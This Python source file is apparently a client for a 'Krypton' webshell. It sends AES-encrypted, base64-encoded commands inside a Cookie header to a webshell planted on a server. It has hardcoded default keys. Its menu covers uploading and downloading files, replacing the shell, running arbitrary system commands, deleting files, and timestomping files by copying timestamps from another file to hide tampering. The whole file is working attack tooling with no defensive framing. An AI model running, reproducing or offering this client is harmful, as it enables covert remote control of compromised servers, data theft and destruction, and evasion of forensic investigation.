from Crypto.Cipher import AES
import base64
import argparse
import requests
from urllib3.exceptions import LocationValueError
from requests.exceptions import ConnectionError
import urllib3
urllib3.disable_warnings()


def pad(payload, block_size=16):
    PADDING = b'\x00'
    return payload + (block_size - len(payload) % block_size) * PADDING


def un_pad(payload):
    PADDING = b'\x00'
    return payload.replace(PADDING, '')


def encrypt_Data(data, key, iv):

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data))
    return base64.b64encode(ciphertext)


def sendCommand(command, data_to_send, URL):

    if data_to_send:
        try:
            command = "cmd=%s" % command
            data = {"data": data_to_send}
            cookies = {"Cookie": command}
            response = requests.post(
                URL, params=data, headers=cookies, timeout=(10, 20))
            return response.content
        except (OSError, IOError, ConnectionError, LocationValueError, UnicodeError, UnicodeEncodeError) as e:
            pass
    else:
        try:
            command = "cmd=%s" % command
            cookies = {"Cookie": command}
            response = requests.post(
                URL, headers=cookies, timeout=(10, 20))
            return response.content
        except (OSError, IOError, ConnectionError, LocationValueError, UnicodeError, UnicodeEncodeError) as e:
            pass


def send_and_decrypt(command, data, key, iv, URL):

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(command))
    encoded = base64.b64encode(ciphertext)
    cookie = encoded.decode('utf-8')
    res = sendCommand(cookie, data, URL)
    decoded = base64.b64decode(res)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    plain = cipher.decrypt(decoded)
    return plain


def main():
    parser = argparse.ArgumentParser(description='Krypton Webshll Client')
    parser.add_argument('-u', '--url', action='store',
                        dest='url', help='URL of Krypton Webshell')
    parser.add_argument('-k', '--key', action='store',
                        dest='key', help='Password to connect to webshell')
    parser.add_argument('-i', '--iv', action='store',
                        dest='iv', help='IV to connect to webshell')
    args = parser.parse_args()

    if args.url:
        URL = args.url
        if args.key:
            key = str.encode(args.key)
        else:
            key = b'J8fs4F4rnP7nFl#f'

        if args.iv:
            iv = str.encode(args.iv)
        else:
            iv = b'D68gq#5p0(3Ndsk!'

        end = False
        while end == False:
            q = input(
                "Enter Command Krypton Command (put,update,time,cmd,del,get) or type quit to end: ")
            command = q.lower().rstrip()
            if q == "quit":
                end = True
            elif command == "put":
                filepath = input("Enter filename: ")
                com = b'put;'
                filepath = filepath.encode('ascii')
                filepath = base64.b64encode(filepath)
                com += filepath
                b64Data = input("Enter data (base64): ")
                data = base64.b64decode(b64Data)
                data = encrypt_Data(data, key, iv)
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))
            elif command == "update":
                com = b'update;'
                b64Data = input("Enter data (base64): ")
                data = base64.b64decode(b64Data)
                data = encrypt_Data(data, key, iv)
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))
            elif command == "time":
                filepath = input("Enter file to copy MAC from: ")
                com = b'time;'
                filepath = filepath.encode('ascii')
                filepath = base64.b64encode(filepath)
                com += filepath
                data = None
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))
            elif command == "cmd":
                filepath = input("Enter command to run: ")
                com = b'cmd;'
                filepath = filepath.encode('ascii')
                filepath = base64.b64encode(filepath)
                com += filepath
                data = None
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))
            elif command == "del":
                filepath = input("Enter full path to delete: ")
                com = b'del;'
                filepath = filepath.encode('ascii')
                filepath = base64.b64encode(filepath)
                com += filepath
                data = None
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))
            elif command == "get":
                filepath = input("Enter full path to get: ")
                com = b'get;'
                filepath = filepath.encode('ascii')
                filepath = base64.b64encode(filepath)
                com += filepath
                data = None
                print("Webshell Response: %s" %
                      send_and_decrypt(com, data, key, iv, URL))

            else:
                print("Wrong Command Entered")
    else:
        print("Please provide URL to connect to")


if __name__ == "__main__":
    main()
